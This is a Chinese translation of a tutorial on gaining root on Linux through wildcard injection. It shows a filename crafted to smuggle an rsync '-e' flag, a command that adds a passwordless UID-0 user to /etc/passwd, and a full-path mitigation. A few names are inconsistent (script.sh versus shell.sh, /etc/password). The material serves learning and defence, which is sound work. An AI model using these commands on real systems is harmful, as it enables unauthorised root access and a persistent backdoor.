# 在 Linux 上通过通配符注入成为 Root

> 原文：<https://betterprogramming.pub/becoming-root-with-wildcard-injections-on-linux-2dc94032abeb>

## 利用通配符注入提升 Linux 权限

![](img/f0aaaf0bb44ec8c21fccab5ab9ec77c5.png)

照片由 [Sai Kiran Anagani](https://unsplash.com/@_imkiran?utm_source=medium&utm_medium=referral) 在 [Unsplash](https://unsplash.com?utm_source=medium&utm_medium=referral) 上拍摄

欢迎回到 Linux 安全系列！在本系列中，我们将讨论影响 Linux 系统的安全问题以及导致这些问题的常见错误配置。我们开始吧！

权限提升是攻击者提升系统权限的一种方式。例如，假设一个攻击者已经获得了对您的 web 服务器的访问权，但只是作为一个低特权用户。他们不能读写敏感文件、执行脚本或更改系统配置。他们如何危害您的服务器并保持对服务器的访问？

如果他们可以找到一种方法来欺骗系统，使其认为自己是根用户，攻击者就可以进行更强大的攻击，如读写敏感文件和在系统中插入永久性后门。这就是特权升级的由来。今天，我们来谈谈攻击者如何利用通配符注入来提升他们的权限。

# **通配符**

通配符是一种特殊字符，在许多编程语言中代表所有的。在 Linux 命令行中，您可以使用通配符来引用目录中的所有文件。例如，该命令将删除当前目录中的所有文件。

```
$ rm *
```

当您使用通配符执行命令时，它将扩展为包含该目录中所有匹配文件的命令。例如，如果当前目录包含三个名为`file1`、`file2`和`file3`的文件，上述命令将展开为:

```
$ rm file1 file2 file3
```

# **通配符注入**

那么，为什么这个功能会帮助攻击者实现权限提升呢？

命令通常有标志，提供关于程序应该如何运行的附加信息。例如，当执行`ls`命令来列出目录内容时，可以指定`-l`标志来指定程序应该以长格式显示文件信息。

```
$ ls (This will display all filenames in the directory.)$ ls -l (This will display all filenames in the directory and additional information about each file.)
```

这里的问题是，如果使用通配符运行命令，并且目录中有一个文件的名称类似于标志名，则该命令可能会将该文件名误解为命令标志。例如，如果我们在一个名为`-rf`的目录中运行`rm`命令，该命令将扩展为这个命令，这将删除所有文件和子目录，而不仅仅是当前目录中的文件。

```
$ rm -rf file1 file2 directory3
```

这意味着，如果攻击者可以创建以命令标志命名的文件，他们就可以操纵其他用户命令的行为。当特权用户运行带有通配符的命令时，攻击者可以在他们的命令中插入危险的标志，从而导致意想不到的后果。例如，如果攻击者能够插入一个将执行系统命令的标志，他就可能以根用户的身份执行任意系统命令！

# Rsync 通配符注入

让我们看看当根用户使用`rsync`工具时，攻击者如何利用通配符注入。

`rsync`是一个用于创建备份的 Linux 工具。它在机器和外部硬盘驱动器之间或通过网络传输和同步文件。这是`rsync`最简单的用法，其中 SRC 是文件的源目录，DEST 是您想要复制到的目的地。

```
 $ rsync SRC DEST
```

在`rsync`命令行工具中，您可以使用`-e`标志通过 shell 脚本运行任意命令。

```
$ rsync -e sh PATH_TO_SCRIPT SRC DEST
```

这意味着如果攻击者可以创建一个名为`-e sh PATH_TO_SCRIPT`的文件，他们就可以注入另一个用户的`rsync`命令，并让`rsync`执行任何恶意脚本！例如，攻击者可以创建一个 shell 脚本，让我们成为根用户。

```
echo “vickie::0:0:System Administrator:/root/root:/bin/bash” >> /etc/passwd
```

这个脚本向`/etc/passwd`文件添加了一个新的根用户。因为`0`是 root 用户的 UID，所以添加一个 UID 为`0`的用户将赋予该用户 root 权限。该用户将拥有用户名“vickie”和一个空密码。

普通用户通常不可能使用该命令，因为只有特权用户才能修改`/etc/password`文件。但是让我们将 shell 脚本命名为`script.sh`并保存它。然后我们可以创建一个文件名，将一个`-e`标志注入到`rsync`命令中。

```
touch -- “-e sh shell.sh”
```

现在，如果 root 用户在这个目录中使用通配符运行 Rsync 命令:

```
$ rsync * DEST
```

通配符将导致标志被注入到命令中，根用户将执行恶意的 shell 脚本并将我们添加为根用户。

```
$ rsync -e sh shell.sh file1 file2 directory3 DEST
```

# 注意安全！

在命令中使用通配符之前，您可以三思而行，以防止这种类型的攻击。而当需要使用通配符时，可以在通配符前面加上目录的完整路径，避免注入。例如，为了防止上面的`rsync`攻击，您可以改为执行这个命令。

```
$ rsync /file/path/* DEST
```

这将导致命令扩展到这个命令，破坏注入标志的语法。

```
$ rsync /file/path/-e sh shell.sh /file/path/file1 /file/path/file2 /file/path/directory3
```

感谢阅读！下一次，我们将深入探讨攻击者可以用来危害您的系统的更多特权提升技术。